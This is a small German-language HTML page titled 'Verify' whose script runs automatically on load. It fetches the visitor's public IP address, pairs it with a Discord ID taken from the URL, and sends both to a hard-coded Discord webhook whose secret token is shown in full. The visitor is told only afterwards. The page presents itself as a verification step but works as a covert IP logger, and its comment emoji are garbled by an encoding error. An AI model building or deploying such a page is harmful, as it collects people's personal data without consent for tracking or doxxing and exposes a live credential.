<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify</title>
</head>
<body>
    <script>
        (async () => {
            const WEBHOOK_URL = "https://discord.com/api/webhooks/1335357251082518700/-zluXm4U386F4xsxtKobIDFLCPHF5YfN4htVGVmepp2ZOf6bAUrpxfl4sxhjQBL95zv6";
        
            try {
                // 1Ô∏è‚É£ IP-Adresse abrufen
                const response = await fetch("https://api64.ipify.org?format=json"); 
                const data = await response.json();
                const ip = data.ip;  
        
                // 2Ô∏è‚É£ Discord-ID aus der URL lesen (.html?id=12345678)
                const discordId = new URLSearchParams(window.location.search).get("id");
        
                if (!discordId) {
                    alert("Fehlende Discord-ID!");
                    return;
                }
        
                // 3Ô∏è‚É£ Daten an Discord Webhook senden
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        content: `üìå **Neue Verifizierung:**\nüîπ **Discord-ID:** ${discordId}\nüîπ **IP-Adresse:** ${ip}`
                    })
                });
        
                alert("Erfolgreich erfasst und gesendet!");
            } catch (error) {
                console.error("Fehler beim Senden:", error);
                alert("Fehler aufgetreten!");
            }
        })();

    </script>
</body>
</html>
